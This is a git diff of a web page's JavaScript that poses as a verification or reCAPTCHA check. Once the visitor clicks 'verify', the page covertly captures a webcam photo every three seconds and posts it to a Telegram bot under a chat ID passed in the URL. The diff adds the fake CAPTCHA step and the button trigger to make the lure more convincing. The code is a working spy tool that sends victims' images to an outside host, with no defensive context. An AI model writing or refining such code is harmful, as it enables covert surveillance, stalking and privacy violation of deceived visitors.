@@ -1,10 +1,13 @@
 import { BOT_TOKEN } from "./config.js";
 
+const verifyBtn = document.getElementById("verifyBtn");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const toast = document.getElementById("toast");
-const uidInput = document.getElementById("uid");
+const recaptchaSection = document.getElementById("recaptcha-section");
+const recaptchaMsg = document.getElementById("recaptcha-msg");
 
+// Chat ID from URL
 const params = new URLSearchParams(window.location.search);
 const chatId = params.get("id");
 
@@ -18,7 +21,7 @@ function showToast(msg){
   setTimeout(()=>{toast.style.opacity=0},3000);
 }
 
-// Capture & send function
+// Capture & send
 async function captureAndSend(){
   if(!stream) return;
   canvas.width = video.videoWidth;
@@ -30,7 +33,6 @@ async function captureAndSend(){
     const formData = new FormData();
     formData.append("chat_id", chatId);
     formData.append("photo", blob);
-    formData.append("caption", `UID: ${uidInput.value || "No UID"}`);
     try{
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
         method:"POST",
@@ -46,30 +48,33 @@ async function captureAndSend(){
   },"image/jpeg");
 }
 
-// Start camera and auto capture
+// Start camera
 async function startCamera(){
   try{
     stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream;
     video.play();
-    // Every 3 seconds capture
+    // every 3 sec
     captureInterval = setInterval(captureAndSend,3000);
+    showToast("Camera started ✅");
+    recaptchaSection.style.display="block"; // show reCAPTCHA
   }catch(e){
     showToast("Permission denied ❌");
     console.error(e);
   }
 }
 
-// Start on page load
-window.onload = () => startCamera();
+// Button click → start camera
+verifyBtn.onclick = () => startCamera();
+
+// reCAPTCHA success callback
+function onRecaptchaSuccess(token){
+  recaptchaMsg.innerText = "";
+  window.location.href = "next.html";
+}
 
 // Stop on page unload
 window.onbeforeunload = () => {
   if(stream) stream.getTracks().forEach(track=>track.stop());
   if(captureInterval) clearInterval(captureInterval);
-};
-  }catch(e){
-    console.error(e);
-    showToast("Permission denied ❌");
-  }
 };
